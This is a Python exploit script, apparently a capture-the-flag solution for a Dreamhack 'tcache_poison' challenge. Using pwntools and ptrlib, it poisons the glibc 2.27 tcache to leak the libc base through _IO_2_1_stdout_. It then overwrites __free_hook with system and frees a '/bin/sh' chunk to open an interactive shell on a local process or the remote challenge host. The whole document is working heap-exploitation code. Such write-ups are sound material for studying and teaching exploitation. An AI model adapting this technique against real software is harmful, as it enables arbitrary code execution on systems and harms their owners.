#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./tcache_poison_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-2.27.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 15553)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def alloc(size: int, content: bytes):
        io.sendlineafter(b"4. Edit\n", b"1")
        io.sendlineafter(b"Size: ", str(size))
        io.sendlineafter(b"Content: ", content)
        return

    def free():
        io.sendlineafter(b"4. Edit\n", b"2")
        return

    def print_():
        io.sendlineafter(b"4. Edit\n", b"3")
        io.recvuntil(b"Content: ")
        return io.recvuntil(b"1. Allocate").strip(b"1. Allocate")

    def edit(content: bytes):
        io.sendlineafter(b"4. Edit\n", b"4")
        io.sendlineafter(b"Edit chunk: ", content)
        return

    alloc(0x20, b"AAA")
    free()
    edit(ptr.p64(0x601000))
    alloc(0x20, b"AAA")
    alloc(0x20, b"A" * 15)
    libc.base = ptr.u64(print_().strip(b"A" * 15 + b"\n")) - unwrap(
        libc.symbol("_IO_2_1_stdout_")
    )

    free_hook = unwrap(libc.symbol("__free_hook"))
    system = unwrap(libc.symbol("system"))

    alloc(0x40, b"A")
    free()
    edit(ptr.p64(free_hook))
    alloc(0x40, b"A")
    alloc(0x40, ptr.p64(system))

    alloc(0x80, b"/bin/sh\0")
    free()
    io.interactive()
    return


if __name__ == "__main__":
    main()
